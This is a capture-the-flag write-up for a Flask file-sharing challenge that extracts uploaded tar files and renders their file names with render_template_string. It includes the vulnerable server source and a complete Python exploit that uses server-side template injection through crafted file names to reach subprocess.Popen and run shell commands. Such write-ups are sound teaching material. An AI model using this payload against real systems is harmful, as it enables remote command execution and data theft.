+++
title = 'File Sharing Portal'
tags = [
  "Web",
  "Python",
  "Template Injection"
]
date = 2024-08-06T11:27:07+02:00
draft = true
+++

# File Sharing Portal

**Description**: Welcome to the file sharing portal! We only support tar files!

**Authors**: NoobMaster + NoobHacker

**Points**: 478

**Solve**: 119

## Introduction

The ctf has a very simple structure: we have a form in which we are asked to insert a [tar](https://en.wikipedia.org/wiki/Tar_(computing)) file; once the tar file has been inserted, it is unzipped and we are shown the `name` of files it contains; by clicking on the different files, we can read their contents.

## Source

**The source has comments added later to allow a better understanding of the code in the writeups**

```python
# filename: server.py

#!/usr/bin/env python3
from flask import Flask, request, redirect, render_template, render_template_string
import tarfile
from hashlib import sha256
import os
app = Flask(__name__)

@app.route('/',methods=['GET','POST'])
def main():
    # This function mainly deals with loading the tar file into the server's file system.
    global username
    if request.method == 'GET':
        return render_template('index.html')
    elif request.method == 'POST':
        file = request.files['file']
        if file.filename[-4:] != '.tar': # Check that the file passed is actually a tar file
            return render_template_string("<p> We only support tar files as of right now!</p>") # Otherwise, it renders an error message
        name = sha256(os.urandom(16)).digest().hex() # Creates a random name that it will use to name our tar and the folder in the server's file system
        os.makedirs(f"./uploads/{name}", exist_ok=True) # Create the directory
        file.save(f"./uploads/{name}/{name}.tar") # Save the tar file
        try:
            # Extract the tar file
            tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar')
            tar_file.extractall(path=f'./uploads/{name}/')
            return render_template_string(f"<p>Tar file extracted! View <a href='/view/{name}'>here</a>")
        except:
            return render_template_string("<p>Failed to extract file!</p>")

@app.route('/view/<name>')
def view(name):
    # This function displays the files contained in the .tar file
    if not all([i in "abcdef1234567890" for i in name]): # Check that the file name is in hexadecimal, to avoid any kind of malicious input 
        return render_template_string("<p>Error!</p>")
        #print(os.popen(f'ls ./uploads/{name}').read())
            #print(name)
    files = os.listdir(f"./uploads/{name}") # List all files in the previously created folder 
    out = '<h1>Files</h1><br>'
    files.remove(f'{name}.tar')  # Remove the tar file from the list
    for i in files:
        out += f'<a href="/read/{name}/{i}">{i}</a>' # Show via templates all file names
       # except:
    return render_template_string(out) # Render the template with the render_template_string function

@app.route('/read/<name>/<file>')
def read(name,file):
    # The function shows the contents of the single file
    if (not all([i in "abcdef1234567890" for i in name])): # Check that the file name is in hexadecimal, to avoid any kind of malicious input 
        return render_template_string("<p>Error!</p>")
    if ((".." in name) or (".." in file)) or (("/" in file) or "/" in name):  # Other controls to avoid path er
        return render_template_string("<p>Error!</p>")
    f = open(f'./uploads/{name}/{file}') # Open the file
    data = f.read()
    f.close()
    return data # Return the content of file

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)


```

We can therefore see that there are several parameter checks, and at first one might think that the code is `100%` safe.

## Solution

The first thing that came to mind was to create a [symbolic link](https://www.futurelearn.com/info/courses/linux-for-bioinformatics/0/steps/201767) to access the flag, and indeed this works (try with server.py), the problem is that the filename of the flag is unknown and this does not allow us to create a valid symbolic link.

Once we realised this, we did a thorough analysis of the code and came to the conclusion that the only thing that was not being checked was the name of the unpacked tar file allowing us to insert anything. By combining this with the '`render_template_string`' function (a vulnerable function of flask), it is possible to perform a [template injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#what-is-ssti-server-side-template-injection).

```python
# filename: exploit.py

import requests
import os
import tarfile
from bs4 import BeautifulSoup

url = 'http://redacted.challs.n00bzunit3d.xyz:8080/'


def create_tar(tar_name, file):
    with tarfile.open(tar_name, 'w') as tar:
        tar.add(file, arcname=os.path.basename(file))
    print(f'Tar file created: {tar_name}')


def create_payload(payload):
    with open(payload, 'w') as f:
        f.write('Remember to byte the cookies')

    create_tar('exploit.tar', payload)
    print(f'Payload created: {payload}')


def get_url_view(text):
    soup = BeautifulSoup(text, 'html5lib')
    return [a['href'] for a in soup.find_all('a', href=True)][0]


def leak_subprocess_index():
    payload = "{{int.__class__.__base__.__subclasses__()}}"
    create_payload(payload)

    r = requests.post(url, files={'file': open('exploit.tar', 'rb')})

    url_file = get_url_view(r.text)
    r = requests.get(url + url_file)
    text = r.text[r.text.index('[')+1:]

    list_classes = text.split(',')

    for i, c in enumerate(list_classes):
        if 'subprocess.Popen' in c:
            print(f'Index subprocess.Popen: {i}')
            return str(i)


def get_flag(index):
    payload = "{{int.__class__.__base__.__subclasses__()[" + \
        index + "]('cat *', shell=True, stdout=-1).communicate()}}"
    create_payload(payload)

    r = requests.post(url, files={'file': open('exploit.tar', 'rb')})

    url_file = get_url_view(r.text)
    r = requests.get(url + url_file)

    flag = r.text[r.text.index('n00bz{'):r.text.index('}')+1]
    print(f'Flag: {flag}')


def main():
    subprocess_index = leak_subprocess_index()
    get_flag(subprocess_index)


if __name__ == '__main__':
    main()


```

```stdout
$ flag: n00bz{n3v3r_7rus71ng_t4r_4g41n!_b3506983087e}
```

<p align='right'>Author: akiidjk </p>